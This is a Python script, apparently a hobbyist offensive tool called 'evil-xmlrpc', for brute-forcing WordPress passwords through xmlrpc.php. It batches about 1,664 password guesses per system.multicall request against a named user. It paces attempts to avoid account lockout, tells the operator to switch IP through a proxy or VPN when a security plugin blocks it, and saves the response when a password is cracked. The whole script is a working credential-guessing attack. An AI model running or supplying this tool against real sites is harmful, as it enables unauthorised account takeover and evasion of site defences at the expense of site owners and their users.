#!/usr/bin/python3

# evil-xmlrpc
# created by ~ 0xApt_

'''
https://blog.sucuri.net/2019/05/xmlrpc-php-brute-force-tool.html
If any of the submitted logins are successful in the submitted XML-RPC request, then we will receive all of the WordPress user information regarding that specific user:

<member><name>user_id</name><value><string>2</string></value></member>
<member><name>username</name><value><string>wp.service.controller</string></value></member>

<member><name>first_name</name><value><string></string></value></member>
<member><name>last_name</name><value><string></string></value></member>
<member><name>registered</name><value><dateTime.iso8601>00000000T00:00:00Z</dateTime.iso8601></value></member>
<member><name>bio</name><value><string></string></value></member>
<member><name>email</name><value><string>test@example.com</string></value></member>

Otherwise, it will return a 403 Forbidden-style fault error if authenticating with an existing WordPress user on the targets installation was unsuccessful:

<name>faultCode</name>
<value><int>403</int></value>
</member>
<member>
<name>faultString</name>
<value><string>Incorrect username or password.</string></value>

Since wp.service.controller seems to be unique, we can use that as an identifier
'''

import time
import os
import requests
import sys


ascii_art="""\n                 ██  ▀██                        ▀██
  ▄▄▄▄  ▄▄▄▄ ▄▄▄ ▄▄▄   ██     ▄▄▄ ▄▄▄ ▄▄ ▄▄ ▄▄    ██  ▄▄▄ ▄▄  ▄▄▄ ▄▄▄    ▄▄▄▄
▄█▄▄▄██  ▀█▄  █   ██   ██      ▀█▄▄▀   ██ ██ ██   ██   ██▀ ▀▀  ██▀  ██ ▄█   ▀▀
██        ▀█▄█    ██   ██       ▄█▄    ██ ██ ██   ██   ██      ██    █ ██
 ▀█▄▄▄▀    ▀█    ▄██▄ ▄██▄    ▄█  ██▄ ▄██ ██ ██▄ ▄██▄ ▄██▄     ██▄▄▄▀   ▀█▄▄▄▀
                                                               ██
                                                              ▀▀▀▀
                                By 0xapt"""


print(ascii_art + '\n')

def payload(username,password):
    final_payload = "\n<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>" + username + "</string></value><value><string>" + password + "</string></value></data></array></value></data></array></value></member></struct></value>\n"
    with open('payload_file', 'a') as f:
        f.write(final_payload)

def site_check(url):
    print("[*] Checking if site is vulnerable..")
    req = requests.get(url+'/xmlrpc.php')
    #added .strip() to remove whitespaces in response because of false positives
    if req.text.strip() == "XML-RPC server accepts POST requests only.":
        print("[*] Site is vulnerable!")
    elif req.status_code == 403:
        print ("[*] 403 Status code, possibly blocked by iThemes Security Plugin - Change IP Using Proxy or VPN")
        exit()
    else:
        print("[*] Site is not vulnerable..\n")
        exit()

def countdown(t):
    
    while t:
        mins, secs = divmod(t, 60)
        timer = "[*] Till next requests: " + '{:02d}:{:02d}'.format(mins, secs)
        print(timer, end="\r")
        time.sleep(1)
        t -= 1

def main(x,y):
    
    with open(list, 'r') as f:
        for count, line in enumerate(f):
                pass
        file_value = count + 1
        print("[*] File has %s lines" % (file_value))
   
    #to output attempts
    global attempt
    attempt = 0
    
    #attempt tracker
    attempt_tracker = 0
     
    #while loop that is compared to the end value of the password list
    #until the value of y suddenly becomes greater, it will continue
    while y < file_value:
        
        attempt += 1
        attempt_tracker += 1
    
        if attempt_tracker == 5:
            
            print("\n[*] Waiting 5 mins to prevent lockout...")
          
            # 300 seconds = 5 mins works like a charm
            countdown(300)
            
            #reset attempt tracker
            attempt_tracker = 1
            
            print("[*] Continuing..")
        
        print("\n[*] Sending Payload.. \n[*] Attempt: %s " % (attempt))
        print("[*] Target User: %s" % (user))
        print("[*] Using lines %s to %s from password list" % (x,y)) 
        
        linesInFile = pass_list[x:y]
        os.system('rm %s' % ('payload_file'))
       
        with open('payload_file', 'w') as m:
            m.write(top_1)
                
        with open('payload_file', 'a') as z:
            for l in linesInFile:
                payload(user,l)
            z.write(bottom_1)
        
        with open('payload_file', 'r') as k:
            send_me = k.read()   
            send_data(send_me)
        
        x = y + 1
        y = y + 1664
        
        #wait a little before sending next request
        time.sleep(5)
        
    print("[*] Done")

def send_data(x):
    data = x
    final_url = target_url + "/xmlrpc.php"
    header = {"Content-Type": "application/xml"}
    req = requests.post(final_url, data.encode('utf-8'), headers=header)
    content_length = len(req.text)
    
    if req.status_code == 200:
        pass
    elif req.status_code == 403:
        print ("[*] 403 Status code, possibly blocked by iThemes Security Plugin - Change IP Using Proxy or VPN")
        exit()
    else:
        print ("[*] Quitting")
        exit()
    
    if "wp.service.controller" in req.text:
        print("\n[*] Password Cracked!")
        print("[*] Saving response as 'xml_rpc_CRACKED'")
        print("[*] Content Length: %s" % (content_length))
        with open('xml_rpc_CRACKED', 'w') as w:
            w.write(req.text)
            exit()
    
    elif "parse error. not well formed" in req.text:
        print("\n[*] Error: File likely too big. limit is 1666.")
        print("[*] Saving response as 'xml_rpc_response_ERROR'")
        print("[*] Content Length: %s" % (content_length))
        with open('xml_rpc_response_ERROR', 'w') as m:
            m.write(req.text)
            exit()
        
    else:
        print("[*] Content Length: %s" % (content_length))
        if content_length != 356069:
            print("[*] Interesting.. Saving response..")
            fileName = "xml_rpc_response_interesting_" + str(content_length) + "_attempt_" + str(attempt)
            with open(fileName, 'w') as t:
                t.write(req.text)
        print("[*] Password Not Cracked.")
        #No need to save a response if it isn't cracked
        #print("[*] Saving response as 'xml_rpc_response'")
        #with open('xml_rpc_response', 'a') as t:
            #t.write(req.text)

try:   
    list = sys.argv[1]
    user = sys.argv[2]
    target_url = sys.argv[3]
    
    top_1 = "<?xml version='1.0' encoding='utf-8'?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>"
    bottom_1 = "</data></array></value></param></params></methodCall>"

    #check if target is vulnerable
    site_check(target_url)    
    
    with open(list, 'r') as line:
            pass_list = line.readlines()
    #adjust values here    
    main(0,1664)
        
except IndexError:
    print("[*] Something is missing...")
    print("[*] Ex. python3 evil-xmlrpc.py <passlist> <user> <https://examplesite.com>") 
          
